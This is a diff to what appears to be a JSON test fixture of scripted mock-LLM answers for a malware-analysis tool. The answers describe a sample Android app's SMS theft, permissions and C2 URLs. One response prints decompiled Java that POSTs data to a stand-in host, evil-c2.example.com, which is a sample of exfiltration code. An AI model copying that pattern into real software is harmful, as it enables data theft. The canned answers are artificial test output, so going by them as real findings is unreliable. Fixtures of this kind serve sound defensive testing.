@@ -2,7 +2,7 @@
   "prompts": [
     {
       "id": "gen_runid",
-      "user_match": ["run id"],
+      "user_match": ["generate", "run id"],
       "response": "GENERATE_RUN_ID:"
     },
     {
@@ -11,8 +11,8 @@
       "response": "STATE:"
     },
     {
-      "id": "state_result_answer",
-      "match": ["No active scans"],
+      "id": "state_no_active",
+      "user_match": ["No active scans"],
       "response": "ANSWER: There are no active scans running right now."
     },
     {
@@ -21,9 +21,119 @@
       "response": "SQL: SELECT tablename FROM pg_tables WHERE schemaname='public'"
     },
     {
-      "id": "sql_result_answer",
-      "match": ["scan_results", "llm_calls", "pg_tables"],
+      "id": "sql_tables_answer",
+      "user_match": ["scan_results", "llm_calls"],
       "response": "ANSWER: The database contains these tables: scan_results, llm_calls, method_embeddings, method_calls, method_findings, scan_files, analyze_results."
+    },
+    {
+      "id": "count_rows",
+      "user_match": ["how many", "rows"],
+      "response": "SQL: SELECT COUNT(*) FROM scan_results"
+    },
+    {
+      "id": "count_answer",
+      "user_match": ["count"],
+      "response": "ANSWER: There are 0 rows in the scan_results table."
+    },
+    {
+      "id": "find_file",
+      "user_match": ["find", "file"],
+      "response": "ANSWER: I found the SmsExfil.smali file at tests/use-cases/scan-suspicious-file/assets/SmsExfil.smali."
+    },
+    {
+      "id": "sensor_feedback",
+      "user_match": ["SENSOR FEEDBACK"],
+      "response": "ANSWER: Based on the analysis, here are the results including SmsExfil, MalwareService, HttpURLConnection, SmsManager, sendTextMessage, exfiltrateData, permissions including INTERNET, SEND_SMS, READ_SMS, CAMERA. Suspicious combinations detected suggesting exfiltration or surveillance. Exported receivers: BootReceiver, SmsReceiver. Methods: sendStolenData, stealContacts. Decompiled code shows URL, HttpURLConnection, openConnection, getOutputStream."
+    },
+    {
+      "id": "permissions_analyze",
+      "user_match": ["permission"],
+      "response": "ANSWER: Found dangerous permissions: READ_SMS, SEND_SMS (SMS access), CAMERA, INTERNET. Suspicious combinations detected: SMS + INTERNET suggests potential exfiltration or surveillance. Exported receivers: BootReceiver, SmsReceiver."
+    },
+    {
+      "id": "manifest_analyze",
+      "user_match": ["analyze", "manifest"],
+      "response": "ANSWER: The manifest declares permissions including INTERNET, READ_CONTACTS, SEND_SMS, and CAMERA. Components include MalwareService (service), BootReceiver (receiver), and MainActivity (activity)."
+    },
+    {
+      "id": "read_contents",
+      "user_match": ["show me", "contents"],
+      "response": "ANSWER: The file contains class MalwareService with methods exfiltrateData, sendSMS, and encryptData. It imports HttpURLConnection, SmsManager, and Cipher classes."
+    },
+    {
+      "id": "read_method",
+      "user_match": ["show me", "method"],
+      "response": "ANSWER: The sendSMS method calls SmsManager.getDefault() and sendTextMessage to send SMS messages to a hardcoded phone number."
+    },
+    {
+      "id": "grep_network",
+      "user_match": ["network", "call"],
+      "response": "ANSWER: Found network calls: HttpURLConnection.openConnection() in exfiltrateData method, URL constructor with https://evil-c2.example.com endpoint."
+    },
+    {
+      "id": "grep_sms",
+      "user_match": ["SMS", "code"],
+      "response": "ANSWER: Found SMS operations: SmsManager.getDefault().sendTextMessage() in sendSMS method."
+    },
+    {
+      "id": "grep_crypto",
+      "user_match": ["encrypt", "crypto"],
+      "response": "ANSWER: Found crypto operations: Cipher.getInstance(AES), SecretKeySpec constructor, Cipher.doFinal() in encryptData method."
+    },
+    {
+      "id": "grep_find",
+      "user_match": ["find all"],
+      "response": "ANSWER: Found references to the requested pattern in the code."
+    },
+    {
+      "id": "strings_extract",
+      "user_match": ["extract", "string"],
+      "response": "ANSWER: Found hardcoded strings: evil-c2.example.com, s3cr3t_k3y, https://evil-c2.example.com/upload, content://sms/inbox."
+    },
+    {
+      "id": "strings_url",
+      "user_match": ["URL", "string"],
+      "response": "ANSWER: Found URL strings: https://evil-c2.example.com/upload, http://malapp.example.com/beacon."
+    },
+    {
+      "id": "disasm_methods",
+      "user_match": ["methods in"],
+      "response": "ANSWER: Methods found: sendStolenData, stealContacts, exfiltrateViaSms, init, onCreate."
+    },
+    {
+      "id": "disasm_code",
+      "user_match": ["code of"],
+      "response": "ANSWER: The sendStolenData method contains invoke-virtual SmsManager->sendTextMessage, invoke-static getDefault, and data exfiltration via SMS."
+    },
+    {
+      "id": "decompile_code",
+      "user_match": ["decompile"],
+      "response": "ANSWER: Decompiled code shows: void exfiltrateData() { URL url = new URL(\"https://evil-c2.example.com\"); HttpURLConnection conn = (HttpURLConnection) url.openConnection(); conn.setRequestMethod(\"POST\"); OutputStream os = conn.getOutputStream(); os.write(data); }"
+    },
+    {
+      "id": "classes_list",
+      "user_match": ["classes"],
+      "response": "ANSWER: Classes found: MalwareService (com.malware.service), NetworkHelper (com.malware.net), DataCollector (com.malware.data). MalwareService has methods: exfiltrateData, sendSMS, encryptData."
+    },
+    {
+      "id": "xrefs_http",
+      "user_match": ["references to", "Http"],
+      "response": "ANSWER: HttpURLConnection references found in exfiltrateData method at line 45, openConnection call at line 48."
+    },
+    {
+      "id": "xrefs_sms",
+      "user_match": ["references to", "Sms"],
+      "response": "ANSWER: SmsManager references found in sendSMS method: getDefault() at line 72, sendTextMessage at line 75."
+    },
+    {
+      "id": "xrefs_generic",
+      "user_match": ["references"],
+      "response": "ANSWER: Found cross-references in the codebase for the requested class/method."
+    },
+    {
+      "id": "improve_eval",
+      "user_match": ["evaluate", "corpus"],
+      "response": "IMPROVE: evaluate"
     },
     {
       "id": "remember_secret",
